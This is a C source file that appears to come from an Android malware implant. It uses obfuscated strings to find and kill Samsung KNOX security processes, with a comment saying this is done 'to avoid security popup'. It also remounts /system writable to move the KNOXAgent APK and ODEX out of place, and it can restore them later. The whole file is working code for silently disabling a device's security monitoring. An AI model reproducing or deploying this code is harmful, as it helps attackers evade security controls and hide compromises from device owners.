#include <sys/mount.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <dirent.h>
#include "deobfuscate.h"

static unsigned char knox_agent_apk[] = "\xcf\xdf\x09\x60\x44\x4a\x44\x45\x56\x5e\x60\x52\x41\x41\x60\xbc\xbf\x80\xa9\xb2\x58\x56\x5f\x45\x1f\x52\x41\x5c"; // "/system/app/KNOXAgent.apk"
static unsigned char knox_agent_odex[] = "\x91\x0a\x81\xc2\xe6\xf8\xe6\xe5\xf4\x0c\xc2\xf0\xe1\xe1\xc2\xee\xe3\xe2\xd9\xd0\x0a\xf4\x03\xe5\xc3\x02\xf5\xf4\xf9"; // "/system/app/KNOXAgent.odex"
static unsigned char knox_agent_apk_bak[] = "\xd2\x00\xc5\xfd\xa1\xab\xa1\xa6\xb7\xbf\xfd\xb3\xa2\xa2\xfd\x99\x9c\x9d\x8a\x93\xb5\xb7\xbc\xa6\xfc\xb3"; // "/system/app/KNOXAgent.a"
static unsigned char knox_agent_odex_bak[] = "\x65\x43\x31\xce\x1a\x1c\x1a\x17\x00\x08\xce\x04\x1b\x1b\xce\x32\x2d\x2e\xc3\x24\x06\x00\x0d\x17\xcd\x0e"; // "/system/app/KNOXAgent.o"
static unsigned char proc_cmd[] = "\x5b\x9d\xd6\x8c\x55\x5b\x4c\x48\x8c\x86\x58\x8c\x48\x4e\x41\x49\x52\x4f\x46"; // "/proc/%s/cmdline"
static unsigned char se_android[] = "\x75\x83\xf8\x22\x1d\x1e\x13\x5d\x0a\x10\x14\x1d\x17\x09\x1e\x1c\x17"; // "knox.seandroid"
static unsigned char proc[] = "\x86\x7d\xfe\x5b\x0e\x0c\x1b\x1f"; // "/proc"
static unsigned char system_str[] = "\x30\xba\x8d\x63\x47\xb9\x47\x44\xb5\xad"; // "/system"
static unsigned char ext3_str[] = "\x4b\x62\x2d\xf2\xf7\xc3\xb8"; // "ext3"

#define K_CHECK 0
#define K_KILL  1


int fcopy_knox(FILE *f1, FILE *f2){
  char buffer[512];
  size_t n;

  while ((n = fread(buffer, sizeof(char), sizeof(buffer), f1)) > 0){
    if (fwrite(buffer, sizeof(char), n, f2) != n)
      return -1;
  }

  return 1;
}



// Stop knox processes to avoid security popup

int do_on_knox(int action) {
  DIR *dp;
  struct dirent *ep;
  char str[256];
  char out[256];
  FILE *f;
  struct stat st1;
  int pid;
  int ret = 0;

  dp = opendir(deobfuscate(proc));
  if (dp != NULL) {
    while (ep = readdir (dp)) {
      snprintf(str, sizeof(str), deobfuscate(proc_cmd), ep->d_name);
      if(stat(str, &st1) < 0) continue;
      // Check the process name
      f = fopen(str, "r");
      if(f != NULL) {
	// Look for knox PIDs
	fread(out, 1, sizeof(out), f);
	if(strcasestr(out, deobfuscate(se_android)) != NULL) {
	  pid = strtoul(ep->d_name, NULL, 10);
	  if(action == K_CHECK)
	    ret = pid;
	  else if(action == K_KILL) {
	    // Stop it
	    kill(pid, SIGKILL);
	    ret = 1;
	  }
	}
      }
    }
    
    closedir(dp);
  }

  return ret;
}



int is_knox_present(void) {
  return do_on_knox(K_CHECK);
}

int kill_knox(void) {
  return do_on_knox(K_KILL);
}


// Remove knox from /system/app
int remove_knox(void) {
  FILE *f1;
  FILE *f2;
  struct stat st1;

  if(stat(deobfuscate(knox_agent_apk), &st1) < 0)
    return -1;

  mount(deobfuscate(system_str), deobfuscate(system_str), deobfuscate(ext3_str), MS_REMOUNT, "");

  f1 = fopen(deobfuscate(knox_agent_apk), "r");
  f2 = fopen(deobfuscate(knox_agent_apk_bak), "w");

  if(!f1 || !f2)
    return -1;

  fcopy_knox(f1, f2);
  
  fclose(f1);
  fclose(f2);

  remove(deobfuscate(knox_agent_apk));

  f1 = fopen(deobfuscate(knox_agent_odex), "r");
  f2 = fopen(deobfuscate(knox_agent_odex_bak), "w");

  if(!f1 || !f2)
    return -1;

  fcopy_knox(f1, f2);
  
  fclose(f1);
  fclose(f2);

  remove(deobfuscate(knox_agent_odex));

  mount(deobfuscate(system_str), deobfuscate(system_str), deobfuscate(ext3_str), MS_RDONLY | MS_REMOUNT , "");

  // Kill knox.seandroid process
  kill_knox();

  return 0;
}


// Restore knox in /system/app
int restore_knox(void) {
  FILE *f1;
  FILE *f2;
  char mode[] = "0644";
  struct stat st1;


  if(stat(deobfuscate(knox_agent_apk_bak), &st1) < 0)
    return -1;

  mount(deobfuscate(system_str), deobfuscate(system_str), deobfuscate(ext3_str), MS_REMOUNT, "");

  f1 = fopen(deobfuscate(knox_agent_apk_bak), "r");
  f2 = fopen(deobfuscate(knox_agent_apk), "w");

  if(!f1 || !f2)
    return -1;

  fcopy_knox(f1, f2);
  
  fclose(f1);
  fclose(f2);

  remove(deobfuscate(knox_agent_apk_bak));
  chmod(deobfuscate(knox_agent_apk), strtol(mode, 0, 8));

  f1 = fopen(deobfuscate(knox_agent_odex_bak), "r");
  f2 = fopen(deobfuscate(knox_agent_odex), "w");

  if(!f1 || !f2)
    return -1;

  fcopy_knox(f1, f2);
  
  fclose(f1);
  fclose(f2);

  remove(deobfuscate(knox_agent_odex_bak));
  chmod(deobfuscate(knox_agent_odex), strtol(mode, 0, 8));

  mount(deobfuscate(system_str), deobfuscate(system_str), deobfuscate(ext3_str), MS_RDONLY | MS_REMOUNT , "");

  return 0;
}
